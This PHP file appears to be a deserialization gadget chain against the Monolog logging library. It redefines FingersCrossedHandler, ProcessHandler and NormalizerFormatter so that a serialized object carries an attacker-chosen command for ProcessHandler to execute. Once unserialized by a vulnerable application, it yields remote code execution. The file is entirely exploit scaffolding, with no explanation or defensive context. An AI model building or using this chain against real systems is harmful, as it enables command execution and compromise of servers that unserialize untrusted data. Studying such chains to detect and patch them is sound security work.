<?php

namespace Monolog\Handler
{
    class FingersCrossedHandler
    {
        protected $passthruLevel=0;
        protected $handler;
        protected $buffer;
        
        function __construct($cmd)
        {
            $this->buffer = [["level"=>1]];
            $this->handler = new ProcessHandler($cmd);
        }
    }

    class ProcessHandler
    {
        protected $level=0;
        protected $formatter;
        private $command;
        private $pipes = [];

        function __construct($cmd)
        {
            $this->formatter = new \Monolog\Formatter\NormalizerFormatter();
            $this->command = $cmd;
        }
    }
}

namespace Monolog\Formatter
{
    class NormalizerFormatter
    {
        protected $maxNormalizeDepth = -1;

        function __construct()
        {
        }
    }
}